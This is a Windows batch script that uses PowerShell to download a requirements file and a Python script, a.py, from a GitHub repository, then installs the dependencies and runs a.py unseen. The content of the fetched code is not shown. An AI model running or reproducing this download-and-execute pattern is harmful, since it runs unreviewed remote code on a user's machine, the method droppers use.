@echo off
REM Change directory to where the script should run (optional)
cd %~dp0

REM Download requirements.txt using PowerShell
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/3zizme/test/refs/heads/main/requirements.txt' -OutFile 'requirements.txt'"

REM Install Python dependencies
python -m pip install -r requirements.txt

REM Download a.py using PowerShell
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/3zizme/test/refs/heads/main/a.py' -OutFile 'a.py'"

REM Run a.py
python a.py

REM Close the terminal
exit
